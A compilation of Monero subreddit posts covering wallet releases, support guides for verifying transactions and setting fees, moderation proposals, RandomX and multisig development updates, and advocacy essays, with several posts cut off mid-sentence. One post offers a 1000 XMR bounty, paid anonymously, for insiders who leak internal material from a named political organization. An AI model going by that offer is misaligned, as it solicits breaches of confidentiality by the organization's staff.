Cake Wallet 3.1.4 is out!

By popular demand, we have switched the ""XMR to BTC"" trading pair to XMR.TO.   All other trading pairs, including BTC to XMR, remain with Morphtrade/Morphtoken.

The main difference between XMR.TO and Morphtrade is that in XMR.TO you have to enter the amount of cryptocurrency (namely BTC) that you want to convert to.  Whereas in Morph, you enter the amount for the cryptocurrency you are converting from. 



A demonstration video for XMR.TO on Cake Wallet from our new team member u/deathd0tc0m can be found here https://www.youtube.com/watch?v=_QK4nVwymoU&feature=share.  


If a user sends XMR to BTC using the ""Exchange"" screen, the user can scan the receiving BTC addresses QR code and send directly from their XMR wallet in Cake.  Totally seemless!



We are also excited to announce that user u/deathd0tc0m has joined our support and marketing team.  He can be seen to be quite active already in Cake Wallet's Twitter and Telegram.



The new version of Cake Wallet can be found here:

"Let's change that. In the comments let's post educational links about anything related to monero: economic and social concepts ideally. Those are one of my favorites to think about. 


I like these ones: 


1. The reverse of greshams law https://en.m.wikipedia.org/wiki/Gresham%27s_law#Reverse_of_Gresham's_Law_(Thiers'_Law)


2. The rule of the least tolerant minority https://medium.com/incerto/the-most-intolerant-wins-the-dictatorship-of-the-small-minority-3f1f83ce4e15


3. Perfectly binding vs perfectly hiding https://crypto.stackexchange.com/questions/41822/why-cant-the-commitment-schemes-have-both-information-theoretic-hiding-and-bind

4. Kinda sorta related to compressing the monero blockchain using zk starks. Wish there were more info on this. 
https://www.coindesk.com/starkware-6million-startup-funding-zkstarks/

Also if you can think of good conversation topics we can all engage in and learn from, or debate about, please post them. Let's keep this subreddit active and interesting during this market. I'm still addicted to Monero and seek novel content."
"I noticed some interesting patterns with recent Monero Original spam posts. The same users: /u/InchoativeTolu, /u/HappyPhot, /u/TigerForce9827, /u/Joynesson, /u/FiftiethFrey, /u/OvularElectra, /u/NonindulgentFlirt, /u/MinistrantQuoit, /u/RunawayThessalian et al. are constantly replying to themselves in a select few crypto subs.
 
This tells me it is the same user, trying to spam their agenda. In the Monero subreddit, it is limited to pushing Monero Original (lol).
 
Can we please get these accounts banned (Reddit-wide?) and let's be vigilant for this sort of spam."
We made it to 90k!
"Since I lack the technical knowledge to do this, and I think that it's long overdue, I'm willing to to pay someone to do this. Monerujo needs to get more exposure to inform new users of the only Android wallet available at the Play Store that is trusted by the community, instead of threads getting created here about its trustworthyness or people falling for Freewallet.


Edit: seems to be done! Will be sending it in a couple of hours, and some to blackboxusa for the effort.

"It seems that, due to the influx of new users, MyMonero is under heavy load, which, from time to time, can cause issues. 

A few common issues are as follows.

**Issue 1:** I sent some funds to MyMonero but I am not seeing anything in my account

**Solution:** First and foremost, to put your mind and ease and to verify that your transaction was correctly sent to your address, use this guide to verify your transaction:

https://monero.stackexchange.com/questions/6137/how-do-i-as-a-recipient-verify-that-my-transaction-actually-arrived

^ If this checks out it means that the funds were correctly sent to your address and it's a visibility bug in MyMonero. You can try log out and log in a few times or try again later. 

--------------

**Issue 2:** I get ""Failed to get unspent outs"" when trying to create a transaction

**Solution:** This is caused by a heavy server load due to which MyMonero is unable to generate a transaction. Again, you can try log out and log in a few times or try again later. 

--------------

**Issue 3:** I get ""Not enough spendable outputs"" when trying to create a transaction

**Solution:** This is caused by your funds + the fee being less than the amount you're trying to send. Unfortunately, MyMonero doesn't have an option to ""sweep"" your whole wallet. Therefore, the only work around is to send a smaller amount. 

---------------

Note that you can resolve all issues easily by importing your wallet into the GUI. This is done by using this guide:

https://monero.stackexchange.com/questions/3775/how-to-restore-a-monero-wallet-from-private-keys

As restore height, use the height of the first transaction to your wallet minus 20k. Thus, if the first transaction to your wallet was included in block `1350000`, use `1330000` as restore height. 

In addition, if you want to use a remote node, use:

https://getmonero.org/resources/user-guides/remote_node_gui.html

Lastly, if you incur any issues with the GUI, please use the megathread and read through all the guides first:

"TLDR: Starting a five part series on how to help Monero. This one is why to help Monero. Skim and see the bold sentences for my key points.

What up kiddies? 

So a couple of days ago I made [this post](https://www.reddit.com/r/Monero/comments/6exvf6/dont_like_something_change_it_were_not_doing/) which talked about getting involved in Monero instead of complaining. But I also know that not everybody knows how to get involved, whether they can code or not. For that reason, I have decided to make a small five-part mini-series on how you can help Monero. It will be broken into the following parts:

Part 0 (the unofficial beginning): [Get Involved](https://www.reddit.com/r/Monero/comments/6exvf6/dont_like_something_change_it_were_not_doing/) (just my previous post).

Part 1 (this one): Why Monero?

Part 2: Rethinking progress

Part 3: How to help Monero (general)

Part 4: How to help Monero (coding)

Part 5: How to help Monero (community)

Part 6?: Anything else?

Please note that all of the following thoughts are my own, and you don't have to agree with everything I say. That's the beauty of this. We don't have to 100% agree on everything to work together. :) So without further ado:

**Why help Monero?**

There's a lot of cryptocurrencies out there. You're a busy person with great talents. Why should you give them to Monero? I'll try to summarize the reasons that I'm here and maybe talk about a couple more. Anyone is also, of course, able to share their stories about why *they* are in Monero. I'm sure others will find it insightful.

I really am here for one reason, and one reason only. Kovri. For those who don't know what Kovri is, it's a lightweight C++ adaptation of the I2P network router (originally written in Java) that will improve privacy for everyone by routing all transactions through the I2P network. Why does this get me excited to stay?

**Because Monero is the only cryptocurrency I could find that has at least one semi-alturistic project.**

Other coins have some pretty fun ideas, but they all serve one purpose: to get you to buy their coin and increase it's value. Sia helps you share your hard drive space in an Uber manner, but must be done via Sia coins. Particl is the new coin from SDC people which will have a marketplace integral to their coin, but every transaction is transformed into Particl regardless of what you buy with. There's more. Boy is there more. But they all serve the coin.

I'm not claiming Kovri is completely alturistic, because it does help the Monero network, but it will also be available for anyone else who wants to incease their browsing privacy, whether or not they use Monero. It also helps the I2P network by allowing every Monero node to also act as an I2P node (as far as I understand). But Monero is seeing beyond itself as a coin and community and trying to better the world around it, and not just by changing the way the world does currency, which brings me to my next point.

**Monero isn't just trying to change the way the world does currency.**

""But rehrar. I'm from the blahblahblahcoin community, and we're trying to help the world too. We're trying to change the way the world does currency.""

Sorry man. That ship has sailed. See in 2009, a dude that used the moniker Satoshi Nakamoto launched an, at the time, revolutionary technology called Bitcoin. You may have heard of it. Even if you're trying to make it better and newer and stuff, you're still just trying to do the same thing that was done.

Monero is a currency, and it also does have this goal, but it's not Monero's only goal, at least not in my mind. To me, Monero is an advocate for privacy in general. Monero is trying to put a completely fungible currency in the hands of the everyman. And it's trying to do it without a bunch of big wigs overseeing our every move. 

There are many many people who NEED privacy. No. Not just want. Need. If you live in a first world country, it can be hard to imagine, but there are places where, you can be imprisoned, tortured, or killed for what you buy and/or do. Not just things like illegal drugs. I'm talking having anything to do with a religion that's not the predominant one (doesn't just happen in Islamic countries). There are also people just trying to keep their families alive against their country's hyperinflating currency (see Venezuela, who has outlawed mining Bitcoin). 

There are people in the world who NEED privacy. Does Monero solve everything? No. It's not trying to. But it's trying to bring things one step closer to a better world where people can escape fear and tyranny. 

**A bit of community constructive criticism here.**

Sometimes, I think we lose sight of that as a community. We get caught up in the battle and competition with coins. Forget about them. Seriously. We have our own battle to fight, and it's not against other crypto. There will be resistance to what we're trying to do, from much much bigger fish, and we need to keep our eyes on the prize.

Yes, yes, I know some coins are actively trying to scam people, and that's not right. And you're free to speak your mind, of course (wouldn't dream of trying to stop that). But not every coin is trying to scam. Some are people excited about blockchain tech with big ideas and to them, especially with ICO culture, crypto is the new kickstarter. Are their ideas good? Meh. Usually not. Not everything needs blockchain.

But we have to remember, especially for the people coming into the crypto culture right now, this is the only culture they know. All they know is crypto being a place where you can get some funding to make an idea using a coin or token. They weren't around for the blood, sweat, and tears, going into the ideals behind things like Bitcoin and Monero.

It's like if you go into a new lounge and only see the way it is now and try to make friends and be a part of the culture, only to have some old guy come up to you and say, ""It wasn't like this ten years ago. It was better then. Merp."" And he gets all mad at you for not being there ten years earlier. I get the frustration, but maybe instead of taking it out on noobs with questions, educate them.

One more point then I'm done. I promise. Why help Monero?

**Because the community rocks!**

This is debatable. Some communities don't like us, others do, etc. etc. But if you're willing to get around the quirks and look into the history of both Monero and Kovri (seriously, it will open your eyes as to why some are so jaded and blunt around here), I think you'll come to love this community for what it is. They are more than willing to help you learn, help you code, help you understand fundamentals, and more more more.

**Why did I write this one and not jump straight into what you could do?**

Because I think a person's best work comes not from the potential to make tons of money off of it because they have skin in the game, but from passion projects. Something that even if the price tanked tomorrow, there would still be people who believed in fighting for privacy for everyone that would still continue to work to better Monero.

I kind of adopted Monero as my passion project. I hope you do too. 

Tell me. Why did you start with Monero? How did that change over time? Why are you here now? Tell me:

Why help Monero?"
"Along with some of you I've been reading the recent blog posts about /r/bitcoin moderation, and the counter-slung accusations about /r/btc being an echo chamber. Without voicing my opinion on the matter, it did occur to me that moderating a sub-reddit is a particularly hard thing to do, and it's only going to get harder for the /r/monero moderation team as this sub-reddit grows.

Coupled with that I've noticed an increase in absolutely pointless posts lamenting one failure or another, and hinting that Monero could ""solve"" the problem. This becomes dangerously close to a circle-jerk or echo chamber, and it's unhealthy for our ability to remain pragmatic and realistic.

*Irrational exuberance, the belief that Monero cannot fail, the belief that individual contributors are infallible, and/or the belief that Monero will magically replace Bitcoin, all do more harm than good.*

At the same time, I think that censorship is, on the whole, net negative and accomplishes nothing except opening a bunch of unpaid volunteers up to unnecessary criticism. This is equally untenable, and we certainly don't want an environment that is poisonous or hostile.

I've created this post in order for us to *discuss* the best way forward, but these are my suggestions:

1. Auto-moderator removes posts that receive 3 reports. Instead of mods pro-actively moderating (which could be construed as censorship) let the community use the report button to remove posts. If posts are being maliciously removed, we would increase the auto-moderator threshold, or remove this functionality entirely.

2. That notwithstanding, moderators reserve the right to unhide an automoderated post if it is deemed relevant, regardless of the number of reports it has.

3. Moderators would only actually remove posts / comments that are easily identifiable as spam or malware. Moderators would not remove comments that are ""rude"" or ""mean"". If people want to call fluffypony a big banana, use the downvote button, because I'm not a banana of any kind.

4. Zealotry will be strongly discouraged. This is not an objective measure, but it is deeply subjective, and the onus would be on individuals to hit the report button (or downvote button for comments) where they see zealotry. Practical examples of this could include posts about how the ZCash price has crashed and so therefore Monero is better, or about how such-and-such a person said something about Dash and so therefore Monero is better.

5. Posts about news items that are largely irrelevant should be reported / auto-moderated. This, too, is subjective, but typically if a link is to an article that doesn't mention Monero by name it is irrelevant. Posts about banks stealing money (we know), negative interest rates being applied in a country (we know), corporate fraud and corruption (we know), or the failure of some other cryptocurrency / blockchain project are all largely irrelevant.

6. Posts that are mostly about another cryptocurrency or blockchain project should generally be considered irrelevant and can be reported, with some examples of exceptions as noted below.

7. The exception to these would be posts that describe actual attacks against Bitcoin's traceability, highlight actual improvements to Bitcoin's privacy (especially when those could be applied to Monero too), or are about matters that are so earth-shatteringly important that they simply *need* a thread for discussion within the community.

I look forward to discussing ways we can improve this, for the benefit of newcomers and long-standing community members alike."
Just wanted to come over here and give my thanks to this wonderful project. I believe bitcoin should have the privacy features of monero but if doesn't. Without monero BTC holders would not be guaranteed privacy. When all these alt coins die I believe XMR will be cash and BTC will be gold. I plan on buying some XMR for the long haul but BTC is my baby. So this is my personal thank you to all of you and keep up what your doing.
Not referring to infographics or other promotional materials. I’m just getting a little tired of the “check out this beautiful {insert crypto name} artwork”.
"It was 4 months ago when I announced with [this post](https://www.reddit.com/r/Monero/comments/7nlmlf/new_project_really_simple_multisig_transactions/) that I start to work on a design project to radically simplify the handling of Monero multisig transactions.

I have now a design of a system ready. I call it *Monero Messaging System*, abbreviated as *MMS*, because I propose to build a messaging system into Monero to handle all the shuttling back and forth of data between wallets of people who want to do multisig transactions.

One important single point of the design: The actual message transfer is *outside* the scope of the system and is left to third-party software like [Bitmessage](https://bitmessage.org/), [Tox](https://tox.chat/) or even good old e-mail.

You find a description on they project Taiga site here: [Monero Messaging System](https://taiga.getmonero.org/project/rbrunner7-really-simple-multisig-transactions/wiki/monero-messaging-system). If you are in a hurry and just want to get a first impression how doing multisig could look like with MMS implemented, check the [Usage Scenario](https://taiga.getmonero.org/project/rbrunner7-really-simple-multisig-transactions/wiki/mms-a-usage-scenario).

That scenario shows MMS support in the CLI wallet; the system is designed to eventually support *all* environments however, like the Monero GUI wallet, smartphone wallets, and shop system integrations. It can do so because the MMS is designed to be [an integral part](https://taiga.getmonero.org/project/rbrunner7-really-simple-multisig-transactions/wiki/integral-solution) of the core Monero software.

----

**Q:** And now, rbrunner7? What do you want from us?  
**A:** Feedback, mostly. I would find feedback from Monero devs the most interesting. If you think *Messaging in Monero? Nonsense!* or *That all only for multisig? Overkill!* please speak out right away.

**Q**: Who could actually build this system? You?  
**A**: For substantial parts, yes. However I would probably try to find at least one co-worker to build the first [messaging daemon](https://taiga.getmonero.org/project/rbrunner7-really-simple-multisig-transactions/wiki/mms-messaging-daemon).

**Q**: Isn't this much too massive for you? You are not moneromooo ...  
**A**: I expect the number of new lines of code to be surprisingly small. It's in large parts cleverly combining stuff that is already there. The true value will lay in new interfaces, and the resulting standardization.

**Q**: Are you seeking payment for building the MMS?  
**A**: For me personally, no. (Can't speak for any co-workers, obviously.) Working on Monero is fun for me, which in turn is motivation enough already.

"The mempool is currently a bit clogged due to high transaction volume. Therefore, it may take some time before your transaction gets confirmed. Also note that it takes some time for the dynamic block size to adjust properly. If it would be able to adjust too quickly, it would be too easy to cheat. 

Note that you can increase your fee to ensure your transaction is mined quickly. This is done as follows.

**CLI:**

There are 5 different fee levels that you can choose, namely `default/unimportant/normal/elevated/priority`. These levels correspond to 0-4, respectively. Thus, if you, for instance, want to set the fee level to elevated, type `set priority 3` in the CLI. In addition, the CLI will provide you with a brief overview of your transaction before you send it, so you can always check the fee before broadcasting it. Lastly, note that default is equal to normal. I'd personally advise to take elevated, as priority can get quite expensive. 

**GUI:**

At the right top of the `Send` page you'll see a button to increase or decrease the priority of the transaction. 

---------------------------

# **Verifying that your transaction arrived (as a sender)**

As it may take some time before your transaction is confirmed and shows up, it may be beneficial to verify that your transaction was correctly sent. This is done as follows.

**GUI/CLI:**

1. In the GUI, go to the history page and click on details of the transaction that was sent to Poloniex. | For the CLI, enter the following command: `get_tx_key <transaction_hash>`. 

2. A window should pop up that shows the private tx key. Copy it. | For the CLI, copy the outcome of the `get_tx_key` command.

3. Go to [this](https://xmrchain.net) block explorer.

4. Enter your transaction ID / hash.

5. Now search the page for `Prove sending`. 

6. Enter the private transaction key you obtained in step 2 into the first box. In addition, enter the address of the recipient in the second box.

7. Press on prove sending.

8. If it shows ""output true"" it proves you correctly sent your XMR to the recipient.

-------------------

**MyMonero:**

Unfortunately, MyMonero currently doesn't have an option to obtain the private tx key. Therefore, it is currently impossible to use aforementioned method. 

-------------------

## **Verifying that your transaction arrived (as a recipient)**

**CLI:**

1. In the CLI type `viewkey`, pick the *private* view key. 

2. Go to [this](https://xmrchain.net) blockexplorer 

3. Enter your transaction ID / hash.

4. Now search the page for `Decode outputs`. 

5. Enter your private view key. In addition, enter your address in the second box.

6. Press on decode outputs.

7. If it shows ""output true"" it proves you correctly received your XMR.

-----------------------------

**GUI:**

The GUI currently has no option to directly retrieve the viewkey. Therefore, a workaround is required.

Note that the GUI creates a separate directory for the wallet files, whereas the CLI stores them in the same directory. On Windows the GUI will store wallet files in `documents\Monero`, whereas on Linux and Mac OS X they are stored in `$HOME/Monero`. 

Most convenient is to copy the wallet files that the GUI uses to the same directory as the CLI. Subsequently, open the CLI and enter the name of the wallet. Alternatively, you could specify the path of the wallet file (the .keys file) with the following flag:

`--wallet-file <argument>`

On Windows make sure to launch it from the command line. Go to the folder `monero-wallet-cli` is located and make sure your cursor isn't located on any of the files. Subsequently do SHIFT + right click and it will give you an option to ""Open command window here"". Lastly, type the following command:

`monero-wallet-cli --wallet-file path\to\wallet\file`

On Linux and Mac OS X you should use the terminal to launch `monero-wallet-cli`. Note that this has to be done from the directory `monero-wallet-cli` is located in. The command is as follows:

`./monero-wallet-cli --wallet-file path/to/wallet/file`

After you've successfully opened the wallet the GUI created with the CLI, you simply have to type `viewkey` to obtain the viewkey (make sure to use the *private* viewkey) and `address` to obtain the address. Subsequently, perform the following steps to verify / decrypt your transaction.

1. Go to [this](https://xmrchain.net) blockexplorer 

2. Enter your transaction ID / hash.

3. Now search the page for `Decode outputs`. 

4. Enter your private view key. In addition, enter your address in the second box.

5. Press on decode outputs.

6. If it shows ""output true"" it proves you correctly received your XMR.

-----------------------------

**MyMonero:**

1. On MyMonero, go to account details.

2. Copy the private view key (called `View Key (Private)` on MyMonero). 

3. Go to [this](https://xmrchain.net) blockexplorer.

4. Enter your transaction ID / hash.

5. Now search the page for `Decode outputs`. 

6. Enter your private view key in the first box. In addition, enter your address in the second box.

7. Press on decode outputs.

8. If it shows ""output true"" it proves you correctly received your XMR.

"For those of you who weren't following along in last week's dev meeting, here's an update on where we are with RandomX now:

1. code freeze was on April 30. The spec and reference implementation are now considered final and ready for formal reviews. [https://github.com/tevador/RandomX/tree/master/doc](https://github.com/tevador/RandomX/tree/master/doc)
2. a new benchmarking tool has been provided for testing on CPUs.
3. a CUDA implementation is now working, though there is still room for more optimization. [https://github.com/SChernykh/RandomX\_CUDA](https://github.com/SChernykh/RandomX_CUDA)
4. a preliminary integration with monerod is available, but additional work is needed to support monerod mining. [https://github.com/LMDB/bitmonero/tree/randomx](https://github.com/LMDB/bitmonero/tree/randomx)
5. audit proposals have been solicited from four different auditing teams.
6. we have contacted AMD for their input on the spec.
7. we plan to contact Intel for their input on the spec soon.

&#x200B;

The audits' proposed Statements of Work defining work to be done and associated price, are now online for community members to review on [https://github.com/hyc/RandomxAudits](https://github.com/hyc/RandomxAudits) . Hopefully, as with the Bulletproofs audits, the community will agree to fund at least 2 or 3 of these reviews. Note that the TrailOfBits proposal probably has some errors, which we expect to iron out early next week, so expect it to decrease in scope and price soon.

&#x200B;

ToDo:

* AMD / OpenCL / miner - it's not clear that OpenCL itself will work well enough, probably need to use card-specific asm (GCN) which means very limited support.
* Lack of an OpenCL miner also means we won't have a solution for ARM/smartphone GPUs any time soon.
* ARMv8 JIT / compiler support."
"After it became apparent that ASICs are currently mining on the Monero network, a lot of new threads appeared with the subject of ASIC resistance. In my opinion, it has gotten to the point where they are starting to clutter the subreddit. Therefore, I think it would be best to confine the discussion to this thread. 

In addition, I invite the people that are in favor of allowing ASICs on the network to actually refute arguments made in the [initial blog post](https://www.getmonero.org/2018/02/11/PoW-change-and-key-reuse.html) that set out a somewhat formal stance on ASIC resistance. 

----------------------

**To briefly provide some information regarding the upcoming scheduled protocol upgrade of ~ March 9:**

- Intended fork height of 1788000 (approximately March 9)
- New release (0.14) will essentially be the 0.13.0.4 release (i.e. the `release-v0.13` branch) + the consensus changes 
- Subsequent point release will include new features, bug fixes, and performance improvements that are currently present in master
- PoW tweak will be CryptoNightR + a random change
- Users ought to upgrade to the upcoming 0.14 release (CLI & GUI)
- Pool operators ought to upgrade to the upcoming 0.14 release
- Miners ought to upgrade their mining software to a version that supports the new PoW algorithm
- Mobile wallet users (e.g. Cake Wallet, Monerujo, X wallet, MyMonero, Edge) ought to upgrade to a version that supports the consensus changes
- Presumably MyMonero will also release a new version of their desktop apps that supports the consensus changes
- You do **not** have to move / transfer your coins in advance of the scheduled protocol upgrade to be sufficiently prepared
- As far as I can see (currently), this will be a consensual upgrade and thus no additional coin will be created 

Lastly, I intend to release a more elaborate thread soon with detailed instructions. 

P.S. If you have any questions regarding the scheduled upgrade, feel free to ask them in this thread. "

"Anyone with even just a basic understanding of astrophysics knows that in order for a rocket to get to the moon it requires the passing of multiple stages: construction, ignition, liftoff and the dispensation of various different modules of the rocket before the final zero-gravitational stretch of just the moon-lander. (Or there abouts.)

The “Don’t Buy Monero” meme is one of those stages that has served us well as we continue our journey through the cosmos, but now has the potential to be a detriment and requires separation.

It was a wise-warning spawn out of responsible consideration for investors in an age where such investors might throw money at anything, with little consideration as to whether the technology was stable, secure, credible and of moral foundation.

The basic understanding was: Look, this technology is experimental. You are not buying an iMac here. Anything at any point in time could go seriously wrong and your “investment” would genuinely be in peril.

One only has to look at the recent CoinDash farce to appreciate how easily such calamities can arise, which is exactly the reason why Monero has consistently erred on the side of caution without the evangelical “Buy Me Buy Me” approach that typically tends to surround most projects in this space.

However, the counterpoint to this understanding is one of a perceived confidence: “We don’t have the confidence in our project and neither should you, so don’t invest.”

There is a point at which this projectable lack of confidence within a meme becomes detrimental to our long-term mission, particularly if combined with other memes that haven’t arisen from within, but elsewhere from nefarious actors, that wouldn’t necessarily be detected as separate memes by casual newcomers. (For example: “Don’t Buy Monero…. because MoneroLink” etc).

There is a point where we have to be able to say “Okay, we are now approaching a stage where we feel that the technological foundations of Monero are such that the usual common sense approaches to investing apply. We are confident that the Monero blockchain is reaching a stage where yes, you *can* trust this with your life as often cited as the example case-usage, and yes, in its capacity as a storage of wealth - a currency - it now has the supremacy over its competitors with a view for it being trusted as such.

I’m not necessarily advocating a complete U-turn and waving the “Buy Monero!” flag here. But as the rocketship continues its mission and we can afford to make strategic dispensations with redundant novelty sound-bites, a progressive and intelligently rephrasing of our position could, and should, start to occur.

(In my opinion.)"

"So I checked what happened to the price or Monero today, I'm down one Lamborghini Aventador. But not one fuck did I give.

That's because there's no exit for me. I cannot realize the gains I've made from Monero unless the software actually reaches millions of people to use as private money. Not thousands of speculators pumping on Poloniex so that they can dump it before everyone else.

In order to reach millions of people it needs to be battle hardened real cryptographic cash, trusted around the world, with no central point of failure. 

That includes the developers.

It appears Fluffy has recognized that Monero is about to become a huge target and that the developers are the largest single point of failure. That's why he doesn't travel with the laptop that holds the keys to the git repo. Somehow unlike every other project right now in crypto we managed to find the one guy who understands what this is actually about and he's not stupid. 

Let me repeat that, unlike *every other project* our guy *is not a fool*.

And in his trollish way he is trying to inoculate Monero's immune system. Like me, Fluffy knows that the music has to stop and that we'll still be here. Let's make Monero one of the chairs.

"Satoshi once described ring signatures as being capable of allowing someone to leak a secret without being exposed.  
  
So I propose to put them to a real world test.  
  
Regardless of how you feel this election cycle, you cannot deny that an organization known as Correct the Record (CTR for short) has subverted the legitimate and organic voice of many sites including Reddit.  They spent a year subverting the moderator accounts of all of /r/politics, and have effectively taken over that subreddit.  Considering this was once a default subreddit, I consider that a grave offense to a website I have been a prolific member of for many years.  The truth is a valuable thing, and in the free market of information it can only be arrived at when many competing intelligences argue their positions in an organic setting.  Such shilling on such an unprecedented scale disrupts and degrades the ability of the internet to effectively communicate.  
  
So I am offering a bounty of 1000 Monero to any brave anon who is willing to leak damning information about this organization.  Criteria for 'damning'?  We will let Reddit decide.  Consider it a contest to see which CTR insider can leak the most damning information about the organization.  Create a new screen name and submit your authentic leaks to such subreddits that would consider it newsworthy.  Do not try to cheat and create false information; the information will need to be verifiably true in some way..... i.e. an email you type up and label as 'CTR Internal Memo' won't cut the mustard.  
  
If you meet these qualifications, and assuming your verifiable submission gains the necessary traction, becoming a clear standout above any others who apply for the prize, send me a PM with the same screen name and a Monero address.  I will send you 1000 Monero using the highest mixin settings I can find.  Assuming you take reasonable precautions in creating the new Reddit screen name (tor, vpn, etc) and assuming the leaks themselves do not personally identify you, there will be no way to connect you or trace you as Monero itself is untraceable money.  
  
I think this is an outstanding opportunity for some young and disillusioned CTR shill to earn a substantial bonus to whatever paycheck they have already earned.  If they go the extra mile and hold these Monero for a few years, they stand to be extraordinarily wealthy one day.  
  
Just to cover my ass, I am specifically instructing anyone who takes me up on my offer not to break the rules of Reddit, nor break any laws.  Got that part?  Do not break the rules of Reddit, nor break any laws.  
  
Aside from that, let's see if Monero can help take back Reddit from this shill army.  Deadline is end of the month.  "
"I'm happy to announce that [Monero handling module for Python](https://github.com/emesik/monero-python) is progressing well. Today [v0.5](https://github.com/emesik/monero-python/releases/tag/v0.5) has been released. The main feature added in this version is **offline generation of sub-addresses** thanks to [a great explanation of the process](https://monero.stackexchange.com/questions/10674/how-are-subaddresses-and-account-addresses-generated-from-master-wallet-keys/10676#10676) I received recently.

It's great to be within this community. Thank you all!"
"The recent crypto bubble^tm has caused a great influx of new users, who are arguably relatively less tech-savvy. Currently, by default, the GUI requires a new user to perform a full blockchain sync from scratch before they are able to properly use the wallet. This initial blockchain sync can be a long and tedious process, especially if one is syncing to an HDD. In addition, the feedback received by the user is fairly inferior and the resources required by `monerod` can cause the user's system to become laggy (or, alternatively, the user is unable to use other processes properly). Combining these aspects with the short attention span of contemporary people, an environment is created where the user is, in my opinion, easily agitated by the wallet and thus has a negative user experience. The long initial blockchain sync is also the main culprit of the ""missing transaction"" issues. Basically, the user will send a transaction to his wallet and subsequently think it's missing because he is unable to see it in the wallet (caused by the blockchain not being fully synced yet). This, arguably, causes even more annoyance. In sum, I feel like the current default setup of the GUI is not properly tailored to the current and potential user base. 

I, therefore, propose to make the GUI plug-and-play by default via the bootstrap node option. This basically allows the user, by (temporarily) utilizing a remote node, to immediately use the wallet (and also see payments sent to it) whilst his local node syncs in the background. The wallet will switch to the local node once it is fully synced. The advantages of this setup are as follows. First, users will generally have a more positive user experience, which furthermore may cause a positive feedback loop (e.g. telling their friends about the positive experience). Second, users will incur less issues and require less support. This ensures less time is ""wasted"" in the ecosystem on supporting users. Third, eventually it will result in more users running their own (local) node. In addition, it will result in an increase in full nodes. Lastly, increased userbase and usage, which ultimately strengthens the Monero network and ecosystem. The salient drawback of this proposal is that, by default, users temporarily have to incur the trade-offs of using a remote node. However, I think this temporary sacrifice is worth the long-term benefits. 

Now, you might wonder how I envision this practically. I think we can mitigate the salient drawback by letting the core-team host a few remote nodes, which are then hardcoded and used by default. These nodes, ideally, should have large resources to ensure high uptime and great connectivity. Furthermore, a disclaimer page should be added to the wizard of the GUI that allows the user to opt-out and use custom node settings. Also, to prevent the local daemon from causing the system to lag or interfere with other processes, I propose to add `--max-concurrency 2` as default startup flag for the local daemon. This flag basically limits the amount of CPU resources the integrated daemon (`monerod`) is able to utilize.

Monero's greatest weakness is arguably its usability. This proposal, however, has the potential to significantly improve that. Moreover, whilst third-party wallets will eventually improve Monero's usability, it's important that the official wallets are quite user friendly too.

P.S. To discuss technicalities and security implications of this particular proposal, please use:

"I just moved countries.  From one major ""Western democracy"" to another major ""Western democracy"".  A monetary chaos ensued.  I've got money alright.  Problem is, none of it was in the destination country's banking system.

So, the first hurdle was setting up a bank account -- that took a few days and required me to show up at the bank in person, wait for the banker, listen to his sales pitch of insurance products, and sign a lot of papers.  Just to use MY money.  Think about it.

The second hurdle was trying to transfer fiat from one banking system to the other -- that took a few more days and required submitting a lot of extra information, such as utility statements and certifying where the money came from.  Just to use MY money.  Think about it.

The third hurdle was trying to transfer more fiat from one banking system to another -- and that just didn't work.  The international transfer service that connects to my bank kept saying I don't have enough money in the account -- even though I am trying to transfer less than half of what I do have in that account.  Looks I can't even use MY money.  Think about it.

The fourth hurdle was trying to transfer fiat from one bank to another in the country of origin.  So, the amount leaves one account and never shows up in the other.   I wait for 5 days, and then I try to contact the bank.  They don't do email for this kind of request.  They want me to call.  So, I call them, they ask me for my account number, birth date, email address, the last four digits of social security number, and my mother's maiden name.  Then they promptly put me on hold, and I wait forever while paying an international call rate per minute.  20 minutes later they tell me that they don't know what is going on, and it will take 48 hours to find out.  Again, looks like I can't use MY money.  Think about it.

And none of that would happen if I could just come to a bank, take $25,000 out, and fly with it.  But sorry, we people are not allowed to do that without filling out extra papers.  Think about it.

In the meantime I bought something online this morning for monero.  Submitting the transaction took less than a minute, and the only information I needed was my wallet's password, and an extra key press to confirm the amount.  The recipient had the money a few minutes later. Just like that. Think about it.

And now that you have hopefully THOUGHT ABOUT IT, please start using Monero.  I mean it.  If you are a landlord, go ahead and ask your tenants if any of them will pay in Monero.  If you are a tenant, go ahead and ask your landlord if he would take Monero.  If you are selling something on Craigslist, check that cryptocurrency box, and ask the buyer if he can pay in Monero.  If you are buying something on Craigslist, ask the seller if he is willing to take Monero.  Give discounts that you can afford to people who pay or agree to be paid in Monero.  The word will spread.  The antiquated banking system will die.  The world will be a better place.

"The development branch of Monero recently got an important new feature: *Multisig transactions*. You can currently do such transactions with a self-compiled version of Monero (source is on [GitHub](https://github.com/monero-project/monero)) on V7 Testnet and with the help of the CLI wallet. /u/JollyMort wrote a good and detailed tutorial on the [Monero StackOverflow site](https://monero.stackexchange.com/questions/5646/how-to-use-monero-multisignature-wallets-2-2-2-3).

I see those multisig transactions as a major technical achievement that may become quite important for the future of Monero. Kudos from me to all that worked hard to make them possible.

However right now preparing multisig wallets and making multisig transactions need quite intricate, somewhat complex and thus also error-prone procedures: Just have a look at the 2/3 multisig tutorial.

In a true open-source/volunteer project like Monero nothing happens unless somebody does it. When I started to make noise about a need to simplify complex multisig on the Monero dev IRC channel, moneromooo reacted with a dry *Please do!*, and rightly so.

I therefore started a new project that I called *Really Simple Multisig Transactions* and already worked quite a bit on it. It can be found on the [getmonero.org Taiga site](https://taiga.getmonero.org/project/rbrunner7-really-simple-multisig-transactions/wiki/home).

What I aspire for is not merely tweaking the currently CLI-wallet-based processes to make them a little less complicated and daunting, but to achieve a true **quantum leap** in simplicity. I am hopeful that this is achievable, and I do have a proposal for a possible way, but nothing is sure yet of course.

Because it tends to be quite easy to produce misunderstandings, let me state it clearly: For me this is not something along the lines of *Monero multisig is rubbish. Why can't somebody make it better?* I would like you to see my initiative as the following:

*Monero multisig got a nice and stable fundament. Let us build a truly beautiful house on top of that.*

Please note that this project is not or at least not yet about *implementing* something better already: What is first needed, IMHO, is a solid concept how Monero could support multisig in a really simple way, and already fully developing this concept is probably a major undertaking. (If you are sceptical, maybe you never ""architected"" something bigger in IT...)

It's also clear that probably I won't be able to do this alone; I hope for help from other community members, and I invite people to participate.

"# A simple guide to Monero for Bitcoin users

Given the much increased interest in Monero recently, I decided to reproduce here a blog post I had made a few weeks ago to introduce Bitcoin users to Monero. What follows is a simple guide to Monero for users that are accustomed to Bitcoin usage and terminology. We highlight the differences between the basic aspects of those cryptocurrencies, so Bitcoin users can get acquainted with Monero easily.

